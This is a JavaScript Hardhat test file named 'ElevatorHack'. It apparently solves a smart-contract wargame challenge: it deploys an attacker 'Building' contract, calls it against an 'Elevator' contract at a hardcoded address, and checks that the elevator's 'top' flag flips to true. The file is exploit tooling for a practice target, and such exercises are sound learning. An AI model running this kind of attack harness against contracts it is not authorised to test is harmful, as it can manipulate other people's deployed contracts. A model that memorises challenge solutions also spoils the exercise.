const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("ElevatorHack", function () {
    
    beforeEach(async function () {
        const Building = await ethers.getContractFactory("Building");
        this.building = await Building.deploy();
        console.log("Building deployed to: "+this.building.address);
    });
    
    it("Attack", async function () {
        const elevator_address = "0xf38c392B2610CdE1Be80933eC7F6A9ec86b5F0ce";
        elevator = await ethers.getContractAt("Elevator", elevator_address);
        expect(await elevator.top()).to.equal(false);
        
        const tx = await this.building.runElevator(elevator_address);
        await tx.wait(1);

        expect(await elevator.top()).to.equal(true);
  });

  afterEach(async function() {
  });

});
